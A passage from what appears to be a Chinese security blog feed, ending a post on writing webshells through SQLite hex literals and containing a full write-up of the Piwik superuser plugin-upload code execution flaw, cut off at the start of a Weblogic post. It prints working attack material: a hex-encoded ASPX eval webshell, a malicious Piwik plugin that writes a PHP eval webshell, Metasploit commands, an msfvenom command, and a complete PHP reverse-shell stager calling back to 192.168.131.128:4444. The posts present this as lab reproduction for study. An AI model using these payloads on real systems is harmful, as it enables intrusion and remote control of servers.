src="%E6%95%B0%E6%8D%AE%E5%86%85%E5%AE%B9%E5%AF%B9%E6%AF%94.jpg" alt="数据内容对比"></p><p>对比后发现网站生成的内容都多了一个空格。</p><p>有同事提议说用十六进制试试，然后将shell内容转换为十六进制后插入。然而在web上测试失败。</p><p><img src="web%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%86%99SHELL1.jpg" alt="web十六进制写SHELL1"></p><p>本地测试也失败。</p><p><img src="%E6%9C%AC%E5%9C%B0%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%86%99%E6%96%87%E4%BB%B6.jpg" alt="本地十六进制写文件"></p><p>经过搜索发现，SQLite中十六进制的写法为：<code>x&#39;....&#39;</code>，而不是<code>0x....</code>。</p><p>例如<code>&lt;%@ Page Language=&quot;Jscript&quot;&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code>在SQLite中的十六进制表示为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x<span class="string">'3c25402050616765204c616e67756167653d224a736372697074223e3c256576616c28526571756573742e4974656d5b2270617373225d2c22756e7361666522293b253e'</span></span><br></pre></td></tr></table></figure><p>成功写入shell</p><p><img src="%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%86%99shell.jpg" alt="十六进制写shell"></p><p>菜刀连接：</p><p><img src="shell%E5%86%99%E5%85%A5%E6%88%90%E5%8A%9F.jpg" alt="shell写入成功"></p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>通过以上的测试过程和实际利用，可以归纳两点：</p><p>1.SQLite可以创建任意格式的数据库文件，并且插入的代码可以根据文件格式来解析，这就造成了可以利用这种方式写WEBSHELL的原因。<br>2.SQLite中十六进制的写法为：<code>x&#39;....&#39;</code>，而不是<code>0x....</code>。</p><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="http://www.cnblogs.com/xiaozi/p/5760321.html" target="_blank" rel="noopener">http://www.cnblogs.com/xiaozi/p/5760321.html</a><br>[2]<a href="https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet" target="_blank" rel="noopener">https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet</a><br>[3]<a href="http://blog.csdn.net/mazhaojuan/article/details/7660657" target="_blank" rel="noopener">http://blog.csdn.net/mazhaojuan/article/details/7660657</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEBSHELL </tag>
            
            <tag> SQLite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Piwik代码执行漏洞安全分析（附验证过程Getshell）</title>
      <link href="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/"/>
      <url>/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h3><p><a href="https://piwik.org/" target="_blank" rel="noopener">Piwik</a>是一个PHP和MySQL的开放源代码的Web统计软件. 它给你一些关于你的网站的实用统计报告，比如网页浏览人数, 访问最多的页面, 搜索引擎关键词等等。</p><p>Piwik拥有众多不同功能的插件，你可以添加新的功能或是移除你不需要的功能，Piwik同样可以安装在你的服务器上面，数据就保存在你自己的服务器上面。你可以非常容易的插入统计图表到你的博客或是网站抑或是后台的控制面板中。安装完成后，你只需将一小段代码放到将要统计的网页中即可。</p><a id="more"></a><p>在17年2月份<a href="https://firefart.at/post/turning_piwik_superuser_creds_into_rce/" target="_blank" rel="noopener">FireFart</a>报告了一个Piwik超级用户获取远程代码执行的漏洞。该漏洞通过利用构造插件，然后利用超级用户上传并激活，在激活插件时会执行插件中的PayLoad，从而获取shell。本文将介绍一下漏洞原理、环境的搭建、PayLoad的构造以及漏洞的复现过程，如有不足，请多多指教。</p><h3 id="0x02-漏洞原理分析"><a href="#0x02-漏洞原理分析" class="headerlink" title="0x02 漏洞原理分析"></a>0x02 漏洞原理分析</h3><p>插件激活时请求的URL为：<br><a href="http://192.168.217.1/piwik-3.0.1/index.php?module=CorePluginsAdmin&amp;action=activate&amp;idSite=1&amp;period=day&amp;date=yesterday&amp;nonce=4fe9b3937078e06f3f24d45a53ee614c&amp;pluginName=ff" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/index.php?module=CorePluginsAdmin&amp;action=activate&amp;idSite=1&amp;period=day&amp;date=yesterday&amp;nonce=4fe9b3937078e06f3f24d45a53ee614c&amp;pluginName=ff</a></p><p>代码定位到<code>piwik-3.0.1\plugins\CorePluginsAdmin\Controller.php</code>中的activate方法。</p><p>找到pluginManager调用的激活插件方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">($redirectAfter = true)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pluginName = <span class="keyword">$this</span>-&gt;initPluginModification(<span class="keyword">static</span>::ACTIVATE_NONCE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dieIfPluginsAdminIsDisabled();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;pluginManager-&gt;activatePlugin($pluginName);<span class="comment">//激活插件</span></span><br><span class="line">        ....</span><br><span class="line">        <span class="comment">//省略部分代码</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>然后往上翻，找到pluginManager变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $pluginManager;</span><br><span class="line">....</span><br><span class="line"><span class="comment">//省略部分代码</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;pluginManager = Plugin\Manager::getInstance();</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>定位到<code>piwik-3.0.1\core\Plugin\Manager.php</code>文件，找到其activatePlugin方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activatePlugin</span><span class="params">($pluginName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">....</span><br><span class="line">        <span class="comment">//省略部分代码</span></span><br><span class="line">        <span class="comment">// Load plugin</span></span><br><span class="line">        $plugin = <span class="keyword">$this</span>-&gt;loadPlugin($pluginName);</span><br><span class="line">        <span class="keyword">if</span> ($plugin === <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">"The plugin '$pluginName' was found in the filesystem, but could not be loaded.'"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;installPluginIfNecessary($plugin);</span><br><span class="line">        $plugin-&gt;activate();</span><br><span class="line">....</span><br><span class="line">        <span class="comment">//省略部分代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>loadPlugin是根据插件名字加载，最后生成一个类对象，可以直接调用其中的方法，其代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadPlugin</span><span class="params">($pluginName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;loadedPlugins[$pluginName])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;loadedPlugins[$pluginName];</span><br><span class="line">    &#125;</span><br><span class="line">    $newPlugin = <span class="keyword">$this</span>-&gt;makePluginClass($pluginName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;addLoadedPlugin($pluginName, $newPlugin);</span><br><span class="line">    <span class="keyword">return</span> $newPlugin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>installPluginIfNecessary方法是判断该插件是否安装，如果没有安装的话，调用executePluginInstall方法来安装，executePluginInstall方法执行了插件中的install()方法，然后再执行activate()方法。</p><p>由此可知，当激活插件时，会加载插件，将其生成为类对象。然后判断是否安装插件，如果没有安装，调用插件中的install()方法，再调用activate()方法。<br>接下来就开始搭建环境具体来实现一下。</p><h3 id="0x03-环境的搭建"><a href="#0x03-环境的搭建" class="headerlink" title="0x03 环境的搭建"></a>0x03 环境的搭建</h3><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><p>主机：Windows10 x64</p><p>WEB环境：采用的是phpStudy集成环境（PHP/5.5.30，MySQL/5.5.47，Apache/2.4.18 ）</p><p>程序版本：<a href="https://www.exploit-db.com/apps/cec6f1b03cc8ed4e62754919c5922d42-piwik-3.0.1.tar.gz" target="_blank" rel="noopener">3.0.1</a>(也可以在<a href="https://builds.piwik.org/" target="_blank" rel="noopener">https://builds.piwik.org/</a> 下载)</p><h4 id="2-composer工具的安装"><a href="#2-composer工具的安装" class="headerlink" title="2.composer工具的安装"></a>2.composer工具的安装</h4><p>下载地址：<a href="https://getcomposer.org/Composer-Setup.exe" target="_blank" rel="noopener">https://getcomposer.org/Composer-Setup.exe</a></p><p>下载后直接运行Composer-Setup.exe进行安装。</p><p><img src="composer_setup_1.jpg" alt="composer安装"></p><p><img src="composer_setup_2.jpg" alt="选择PHP.exe的位置"></p><p>然后根据提示，继续下一步即可。</p><blockquote><p>注意：安装时PHP应开启php_openssl扩展，不然会报错。</p></blockquote><h4 id="3-Piwik程序的部署"><a href="#3-Piwik程序的部署" class="headerlink" title="3.Piwik程序的部署"></a>3.Piwik程序的部署</h4><p>将下载下来的程序源码解压到phpStudy下的WWW目录。这里我项目名字为piwik-3.0.1。</p><p>在piwik-3.0.1目录下执行<code>composer install</code>命令来安装项目所依赖的代码库。</p><p><img src="composer_setup_3.png" alt="依赖的代码库的安装"></p><p>安装后在项目的根目录会出现一个vendor文件夹。</p><p><img src="vendor_files.jpg" alt="vendor目录下文件"></p><p>访问<a href="http://192.168.217.1/piwik-3.0.1/" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/</a> 开始进行安装</p><p><img src="Piwik_setup.jpg" alt="Piwik安装"></p><p>点击Next进行下一步安装。</p><p>数据库设置</p><p><img src="Piwik_Database_setup.png" alt="数据库设置"></p><p>超级用户设置</p><p><img src="Piwik_superUser_set.jpg" alt="超级用户设置"></p><p>之后进行系统的设置，这里就省略过程了。</p><p>安装完成后访问<a href="http://192.168.217.1/piwik-3.0.1/" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/</a> 进行登陆。</p><p><img src="piwik_login.jpg" alt="piwik登陆人口"></p><blockquote><p>用户名/密码为第五步中设置的超级用户。</p></blockquote><h3 id="0x04-验证过程"><a href="#0x04-验证过程" class="headerlink" title="0x04 验证过程"></a>0x04 验证过程</h3><h4 id="1-漏洞产生原因及PayLoad的编写"><a href="#1-漏洞产生原因及PayLoad的编写" class="headerlink" title="1.漏洞产生原因及PayLoad的编写"></a>1.漏洞产生原因及PayLoad的编写</h4><p>Piwik默认在3.0.3之前允许自定义插件上传，当插件被激活时，install方法会被调用，会执行其中编写的PayLoad。</p><p>如果我们编写一个名字叫做pwned的插件，其文件结构为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwned/</span><br><span class="line">pwned/pwned.php</span><br><span class="line">pwned/plugin.json</span><br></pre></td></tr></table></figure><p>文件内容：</p><p>pwned.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="comment">//要执行的Payload</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>plugin.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"pwned"</span>,<span class="comment">//插件名称</span></span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">"DESCRIPTION"</span>,<span class="comment">//插件描述</span></span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0"</span>,<span class="comment">//插件版本</span></span><br><span class="line">  <span class="attr">"theme"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将其压缩为zip格式的压缩文件。当插件上传后并被激活时，就会执行pwned.php中的payload。</p><h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><p><strong>PayLoad的准备</strong></p><p>修改上述的pwned.php代码，在install方法中添加写shell的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    $myfile = fopen(<span class="string">"shell.php"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$content = <span class="string">"&lt;?eval(\$_POST['pass']);?&gt;"</span>;</span><br><span class="line">fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>plugin.json不用做过多的修改。</p><p>然后压缩为pwned.zip。</p><p><strong>PayLoad的利用</strong></p><p>利用创建的超级用户登陆，登陆后点击Administration或者访问<a href="http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday</a></p><p><img src="piwik_plugins.jpg" alt="piwik 插件人口"></p><p>安装新插件</p><p><img src="piwik_plugins_install.jpg" alt="piwik 安装新插件人口"></p><p>上传新插件</p><p><img src="piwik_plugins_upload.jpg" alt="piwik 插件市场"></p><p>插件上传</p><p><img src="piwik_plugins_uploading.jpg" alt="piwik 插件上传"></p><p>插件上传成功</p><p><img src="piwik_plugins_uploadsuccess.jpg" alt="piwik 插件上传成功"></p><p>然后点击激活插件按钮</p><p><img src="plugin_activated.jpg" alt="插件激活"></p><p>插件激活后，会在根目录生成一个shell.php</p><p><img src="shell.jpg" alt="shell"></p><h4 id="3-利用Metasploit生成meterpreter会话"><a href="#3-利用Metasploit生成meterpreter会话" class="headerlink" title="3.利用Metasploit生成meterpreter会话"></a>3.利用Metasploit生成meterpreter会话</h4><p>上面的结果是写入了WEBSHELL，也可以采用piwik_superuser_plugin_upload直接生成一个meterpreter会话。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/unix/webapp/piwik_superuser_plugin_upload </span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; </span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> PASSWORD admin888</span><br><span class="line">PASSWORD =&gt; admin888</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> RHOST 192.168.217.1</span><br><span class="line">RHOST =&gt; 192.168.217.1</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> TARGETURI /piwik-3.0.1/</span><br><span class="line">TARGETURI =&gt; /piwik-3.0.1/</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> USERNAME admin</span><br><span class="line">USERNAME =&gt; admin</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="msf_win01.jpg" alt="脚本说明"></p><p><img src="msf_win02.jpg" alt="成功反弹生成meterpreter会话"></p><blockquote><p>利用Metasploit时有时候会不成功，或者是第一次成功之后无法再次复现。但是利用上传webshell可以成功。</p></blockquote><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>之前在3月份曾经遇到过类似的站点，然后本地搭建环境测试的时候，只顾着用Metasploit进测试，并没有出结果，就没继续下去了。最近又重新看了一下原理，然后实现并记录一下过程。</p><p>这里仅仅用3.0.1举例，根据<a href="https://github.com/rapid7/metasploit-framework/pull/7917" target="_blank" rel="noopener">firefart</a>说的影响版本2.14.0/2.16.0/2.17.1/3.0.1，其他并未测试。</p><p>Q:直接上传包含shell的压缩包可以吗？</p><p>A:可以上传成功，但在plugins目录下无法执行php代码。</p><p><img src="shell_forbidden.jpg" alt="plugins目录下无法执行php代码"></p><p>Q:Payload中除了install()方法还可以写其他方法吗？</p><p>A:可以的。例如还有uninstall/deactivate/activate等方法，分别在卸载插件/关闭插件/激活插件的时候调用。例如如下的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">ff</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span>//安装插件，执行一次</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">$myfile = fopen(<span class="string">"install.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$content = <span class="string">"install ..."</span>;</span><br><span class="line">fwrite($myfile, $content);</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uninstall</span><span class="params">()</span>//卸载插件，执行一次</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">$myfile = fopen(<span class="string">"uninstall.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$content = <span class="string">"uninstall ..."</span>;</span><br><span class="line">fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deactivate</span><span class="params">()</span>//关闭插件，可以多次执行</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">$myfile = fopen(<span class="string">"deactivate.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$content = <span class="string">"deactivate ..."</span>;</span><br><span class="line">fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">()</span>//激活插件，可以多次执行</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">$myfile = fopen(<span class="string">"activate.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$content = <span class="string">"activate ..."</span>;</span><br><span class="line">fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Q:可以上传WEBSHELL，但是利用Metasploit无法生成meterpreter会话，还想反弹shell怎么办？</p><p><img src="msf_error.jpg" alt="无法生成meterpreter会话"></p><p>A:可以利用手动上传插件的方法，将其中的Payload修改为反弹shell的代码。</p><p>具体可以这样操作：</p><p>首先看看Metasploit利用的Payload是什么。</p><p>可以在generate_plugin方法中添加打印payload.encoded的语句，例如使用<code>print_status(&quot;data:#{payload.encoded}&quot;)</code>将其内容打印出来</p><p><img src="payload_getdata.jpg" alt="打印Payload"></p><p>然后使用<code>reload_all</code>重新加载脚本，并使用piwik_superuser_plugin_upload脚本，将会打印出来payload的内容</p><p><img src="payload_datas.jpg" alt="payload内容"></p><blockquote><p>或者可以利用<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.131.128 LPORT=4444 -f raw &gt;c.php</code>来生成payload，内容一样</p></blockquote><p>然后将生成的内容放在插件PHP代码中。整理格式后如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    error_reporting(<span class="number">0</span>); </span><br><span class="line">$ip = <span class="string">'192.168.131.128'</span>; </span><br><span class="line">$port = <span class="number">4444</span>; </span><br><span class="line"><span class="keyword">if</span> (($f = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">$s = $f(<span class="string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="string">'stream'</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (($f = <span class="string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">$s = $f($ip, $port); $s_type = <span class="string">'stream'</span>; </span><br><span class="line">&#125; <span class="keyword">elseif</span> (($f = <span class="string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">$s = $f(AF_INET, SOCK_STREAM, SOL_TCP); </span><br><span class="line">$res = @socket_connect($s, $ip, $port); </span><br><span class="line"><span class="keyword">if</span> (!$res) &#123; <span class="keyword">die</span>(); &#125; </span><br><span class="line">$s_type = <span class="string">'socket'</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'no socket funcs'</span>);</span><br><span class="line">&#125; <span class="keyword">if</span> (!$s) &#123; <span class="keyword">die</span>(<span class="string">'no socket'</span>); &#125; </span><br><span class="line"><span class="keyword">switch</span> ($s_type) &#123; </span><br><span class="line"><span class="keyword">case</span> <span class="string">'stream'</span>: $len = fread($s, <span class="number">4</span>); <span class="keyword">break</span>; </span><br><span class="line"><span class="keyword">case</span> <span class="string">'socket'</span>: $len = socket_read($s, <span class="number">4</span>); <span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (!$len) &#123; <span class="keyword">die</span>(); &#125; </span><br><span class="line">$a = unpack(<span class="string">"Nlen"</span>, $len); </span><br><span class="line">$len = $a[<span class="string">'len'</span>]; </span><br><span class="line">$b = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">while</span> (strlen($b) &lt; $len) &#123; </span><br><span class="line"><span class="keyword">switch</span> ($s_type) &#123; </span><br><span class="line"><span class="keyword">case</span> <span class="string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="keyword">break</span>; </span><br><span class="line"><span class="keyword">case</span> <span class="string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$GLOBALS[<span class="string">'msgsock'</span>] = $s; </span><br><span class="line">$GLOBALS[<span class="string">'msgsock_type'</span>] = $s_type; </span><br><span class="line"><span class="keyword">eval</span>($b);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是利用上传插件来上传插件并激活了。</p><p>正确姿势：</p><p><img src="msf_ubuntu_success.jpg" alt="msf_ubuntu_success"></p><blockquote><p>请注意要加<code>set PAYLOAD php/meterpreter/reverse_tcp</code>，不然会报各种错误。</p></blockquote><p>下面的为其中的错误。</p><p><img src="msf_ubuntu.jpg" alt="msf_ubuntu"></p><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="https://firefart.at/post/turning_piwik_superuser_creds_into_rce/" target="_blank" rel="noopener">https://firefart.at/post/turning_piwik_superuser_creds_into_rce/</a><br>[2]<a href="https://github.com/rapid7/metasploit-framework/pull/7917" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/7917</a></p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> piwik </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic 常见漏洞环境的搭建及其利用</title>
      <link href="/2017/06/05/Weblogic-Vulnerability-Verification/"/>
      <url>/2017/06/05/Weblogic-Vulnerability-Verification/</url>
      
